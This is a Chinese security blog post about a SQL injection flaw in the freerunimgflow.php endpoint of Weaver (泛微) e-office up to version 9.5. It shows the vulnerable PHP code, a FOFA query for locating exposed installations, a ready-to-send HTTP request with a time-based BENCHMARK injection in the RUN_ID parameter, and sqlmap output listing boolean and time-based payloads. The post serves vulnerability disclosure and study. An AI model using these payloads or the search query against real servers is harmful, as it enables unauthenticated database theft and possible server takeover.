---
title: "泛微e-office freerunimgflow.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html
asset_dir: assets/泛微e-office-freerunimgflow.php-sql注入漏洞
---

# 泛微e-office freerunimgflow.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/14 18:27
* 883浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

workflow

SQL

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office freerunimgflow.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/workflow/freerunimgflow.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/img_flow.inc.php" );
include_once( "inc/img_patten.inc.php" );
$connection = openconnection( );
$sql = "\r\n        SELECT PRCS_ID FROM flow_run_prcs \r\n\t\t   WHERE RUN_ID=".$_REQUEST['RUN_ID']." \r\n\t\t     GROUP BY PRCS_ID ASC \r\n         ";
$res = exequery( $connection, $sql );
```

`RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/workflow/freerunimgflow.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
```

[![泛微e-office freerunimgflow.php sql注入漏洞](images/img-001-7f75ad3cb603.webp)](https://image.mrxn.net/ef6164bd2e274cc3bd66556a72b0536e.webp)

成功在延时 5 秒

编程

深入探索

SQL注入防护

文本剥离工具

漏洞修复方案

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: RUN_ID=1 AND 4540=4540

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office freerunimgflow.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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